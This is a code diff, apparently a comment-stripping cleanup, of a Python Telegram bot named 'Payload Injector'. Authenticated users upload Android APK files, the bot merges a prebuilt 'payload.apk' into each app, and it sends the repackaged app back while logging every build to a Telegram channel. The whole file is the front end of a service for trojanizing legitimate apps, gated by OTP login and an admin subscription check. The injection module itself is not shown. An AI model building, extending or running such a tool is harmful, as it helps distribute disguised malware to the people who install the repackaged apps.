@@ -29,17 +29,14 @@ from modules.payload_injector import PayloadInjector
 from modules.telegram_logger import TelegramLogHandler
 from modules.admin_check import check_admin_status
 
-# Ensure logs directory exists
 os.makedirs('logs', exist_ok=True)
 os.makedirs('cache', exist_ok=True)
 
 user_manager = UserManager('data/users2.json')
 bot = TelegramClient('data/bot2_session', API_ID, API_HASH)
 
-# Telegram logger
-telegram_logger = None  # Will be initialized after bot starts
+telegram_logger = None
 
-# Payload APK path
 PAYLOAD_APK = "payload.apk"
 
 
@@ -49,7 +46,6 @@ print("=" * 70)
 
 
 async def prepare_payload_cache():
-    """Prepare payload cache at startup"""
     logger.info("🔧 Preparing payload cache...")
     success = await PayloadInjector.prepare_cache(PAYLOAD_APK)
     if success:
@@ -63,29 +59,26 @@ async def prepare_payload_cache():
 async def handler(event):
     user_id = event.sender_id
     message = event.message
-    
-    # Check if message has a document (APK file)
+
     if message.document:
         if not user_manager.is_authenticated(user_id):
             await event.reply("❌ **Access Denied**\n\nPlease authenticate first\n\n/start")
             return
-        
-        # Check if it's an APK file
+
         file_name = None
         if message.document.attributes:
             for attr in message.document.attributes:
                 if hasattr(attr, 'file_name'):
                     file_name = attr.file_name
                     break
-        
+
         is_apk = False
         if file_name and file_name.lower().endswith('.apk'):
             is_apk = True
         if message.document.mime_type == 'application/vnd.android.package-archive':
             is_apk = True
-        
+
         if is_apk:
-            # Check if user already processing
             if build_queue.is_user_building(user_id):
                 elapsed = build_queue.get_user_elapsed_time(user_id)
                 await event.reply(
@@ -94,8 +87,7 @@ async def handler(event):
                     f"Please wait for current process to complete..."
                 )
                 return
-            
-            # Process APK
+
             await process_payload_injection(event, user_id, message)
         else:
             await event.reply(
@@ -105,11 +97,9 @@ async def handler(event):
                 f"📦 Type: {message.document.mime_type or 'Unknown'}"
             )
         return
-    
-    # Text messages
+
     text = message.message.strip() if message.message else ""
-    
-    # Handle /start command
+
     if text == '/start':
         if user_manager.is_authenticated(user_id):
             await event.reply(
@@ -131,18 +121,15 @@ async def handler(event):
                 "📝 Send your **username** to get started"
             )
         return
-    
-    # If authenticated user sends any other message, ignore
+
     if user_manager.is_authenticated(user_id):
         return
-    
-    # Authentication flow
+
     if user_id in user_manager.waiting_otp:
-        # Waiting for OTP
         if text.isdigit() and len(text) == 6:
             username = user_manager.waiting_otp[user_id]
             success, service_token, msg = verify_otp(username, text)
-            
+
             if success:
                 user_manager.save_user(user_id, username, service_token)
                 del user_manager.waiting_otp[user_id]
@@ -157,11 +144,10 @@ async def handler(event):
         else:
             await event.reply("❌ **Invalid code**\n\nPlease enter a valid 6-digit code")
     else:
-        # Request OTP
         username = text
         await event.reply("📨 **Sending verification code...**")
         success, msg = request_otp(username)
-        
+
         if success:
             user_manager.waiting_otp[user_id] = username
             await event.reply(
@@ -173,22 +159,19 @@ async def handler(event):
 
 
 async def process_payload_injection(event, user_id, message):
-    """Process APK and inject into payload"""
     msg = None
     user_apk_path = None
     final_apk_path = None
     start_time = time.time()
-    
-    # Get user info
+
     user_data = user_manager.users.get(str(user_id), {})
     username = user_data.get('username', 'Unknown')
     service_token = user_data.get('token')
-    
+
     try:
-        # Check admin status before processing (if enabled)
         if ENABLE_ADMIN_CHECK and service_token:
             is_active, admin_msg, device_token = check_admin_status(service_token)
-            
+
             if not is_active:
                 logger.warning(f"User {username} ({user_id}) denied: {admin_msg}")
                 await event.reply(
@@ -196,39 +179,34 @@ async def process_payload_injection(event, user_id, message):
                     f"{admin_msg}\n\n"
                     f"Please contact support if this is an error."
                 )
-                
-                # Log to channel
+
                 if telegram_logger:
                     await telegram_logger.log_admin_check(username, False)
-                
+
                 return
         else:
             logger.debug("Admin check disabled or no token")
-        
+
         await build_queue.acquire(user_id)
-        
-        # Get file info
+
         file_name = message.document.attributes[0].file_name if message.document.attributes else "app.apk"
         file_size = message.document.size
-        
-        # Send initial message
+
         msg = await event.reply(
             f"🚀 **Payload Injection Started**\n\n"
             f"📄 File: {file_name}\n"
             f"💾 Size: {format_size(file_size)}\n\n"
             f"📥 Downloading..."
         )
-        
-        # Generate unique filename
+
         timestamp = int(time.time())
         downloads_dir = "downloads"
         os.makedirs(downloads_dir, exist_ok=True)
-        
+
         user_apk_path = os.path.join(downloads_dir, f"user_{user_id}_{timestamp}.apk")
-        
-        # Download APK from Telegram
+
         last_update = [0]
-        
+
         async def progress_callback(current, total):
             progress = (current / total) * 100
             if progress - last_update[0] >= 10:
@@ -239,41 +217,36 @@ async def process_payload_injection(event, user_id, message):
                     f"📥 Downloading: {progress:.1f}%\n"
                     f"⬇️ {format_size(current)} / {format_size(total)}"
                 )
-        
+
         await bot.download_media(
             message.document,
             file=user_apk_path,
             progress_callback=progress_callback
         )
-        
-        # Update message - injection started
+
         await msg.edit(
             "🔄 **Processing...**\n\n"
             "⚙️ Step 1/6: Decompiling payload...\n"
             "⏳ Please wait..."
         )
-        
-        # Get initial app info for logging
+
         file_size_mb = file_size / (1024 * 1024)
-        
-        # Log to channel - build start
+
         if telegram_logger:
             await telegram_logger.log_event('build_start', user_id, username, {
                 'bot': 'Payload Injector',
                 'app_name': file_name,
                 'size': f"{file_size_mb:.1f} MB"
             })
-        
-        # Inject payload
+
         builds_dir = "builds"
         os.makedirs(builds_dir, exist_ok=True)
         output_apk = os.path.join(builds_dir, f"payload_{user_id}_{timestamp}.apk")
-        
+
         injector = PayloadInjector(PAYLOAD_APK)
         final_apk_path, error, duration = await injector.inject(user_apk_path, output_apk, user_id, username)
-        
+
         if error or not final_apk_path:
-            # Log to channel - build fail
             if telegram_logger:
                 await telegram_logger.log_event('build_fail', user_id, username, {
                     'bot': 'Payload Injector',
@@ -286,16 +259,14 @@ async def process_payload_injection(event, user_id, message):
                 f"Please try again or contact support"
             )
             return
-        
-        # Get final file size
+
         final_size = os.path.getsize(final_apk_path)
-        
-        # Send final APK
+
         await msg.edit(
             "✅ **Injection Complete!**\n\n"
             "📤 Uploading final APK..."
         )
-        
+
         await bot.send_file(
             event.chat_id,
             final_apk_path,
@@ -306,10 +277,9 @@ async def process_payload_injection(event, user_id, message):
                 "🎯 **Payload Injector Bot**"
             )
         )
-        
+
         await msg.delete()
-        
-        # Log to channel - build success
+
         if telegram_logger:
             await telegram_logger.log_event('build_success', user_id, username, {
                 'bot': 'Payload Injector',
@@ -317,9 +287,9 @@ async def process_payload_injection(event, user_id, message):
                 'output_size': format_size(final_size),
                 'duration': duration
             })
-        
+
         logger.info(f"✅ Payload injection complete for user {user_id} ({username}) in {duration}s")
-        
+
     except Exception as e:
         logger.error(f"Process error: {str(e)}", exc_info=True)
         if msg:
@@ -330,13 +300,12 @@ async def process_payload_injection(event, user_id, message):
             )
     finally:
         build_queue.release(user_id)
-        
-        # Cleanup temporary files
+
         try:
             if user_apk_path and os.path.exists(user_apk_path):
                 os.remove(user_apk_path)
                 logger.info(f"Cleaned user APK: {user_apk_path}")
-            
+
             if final_apk_path and os.path.exists(final_apk_path):
                 os.remove(final_apk_path)
                 logger.info(f"Cleaned final APK: {final_apk_path}")
@@ -345,7 +314,6 @@ async def process_payload_injection(event, user_id, message):
 
 
 def format_size(bytes_size):
-    """Format bytes to human readable"""
     for unit in ['B', 'KB', 'MB', 'GB']:
         if bytes_size < 1024.0:
             return f"{bytes_size:.1f} {unit}"
@@ -356,24 +324,18 @@ def format_size(bytes_size):
 if __name__ == '__main__':
     async def main():
         global telegram_logger
-        
-        # Start bot
+
         await bot.start(bot_token=BOT2_TOKEN)
-        
-        # Initialize telegram logger
+
         if LOG_CHANNEL_ID:
             telegram_logger = TelegramLogHandler(bot, LOG_CHANNEL_ID)
             logger.info(f"✅ Telegram logger enabled: {LOG_CHANNEL_ID}")
         else:
             logger.info("⚠️  Telegram logger disabled (no LOG_CHANNEL_ID)")
-        
-        # Note: Cache disabled for now (was causing issues)
-        # await prepare_payload_cache()
-        
+
+
         logger.info("Bot2 (Payload Injector) started and ready!")
-        
-        # Run until disconnected
+
         await bot.run_until_disconnected()
-    
-    # Run
+
     bot.loop.run_until_complete(main())
